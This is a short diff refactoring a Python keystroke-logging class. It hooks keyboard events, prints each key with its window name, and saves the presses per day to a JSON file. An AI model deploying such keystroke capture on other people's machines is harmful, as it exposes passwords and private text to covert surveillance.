@@ -22,7 +22,7 @@ class Logger:
         hook.KeyDown = self.__write_event
 
         try:
-            self.buffer = json.loads(open(self.LOG_FILE, "r").read())  # type: dict
+            self.buffer = self.__load_buffer()
             self.buffer[str(date.today())] = dict()  # create new log dict for current date
         except (FileNotFoundError, json.decoder.JSONDecodeError):
             self.buffer = {str(date.today()): dict()}
@@ -32,7 +32,7 @@ class Logger:
         keyboard press callback, process each key press as necessary.
         if tab or return are in the event the buffer is written out
         """
-        print(event.WindowName, event.Key)
+        print(event.WindowName, event.Key)  # debug
 
         if str(date.today()) not in self.buffer:  # check if current date in dict
             self.buffer[str(date.today())] = dict()
@@ -56,6 +56,8 @@ class Logger:
 
         :return: buffer
         """
+        return json.loads(open(self.LOG_FILE, "r").read())
+
     def __dump_buffer(self):
         """
         Dumps json to log file
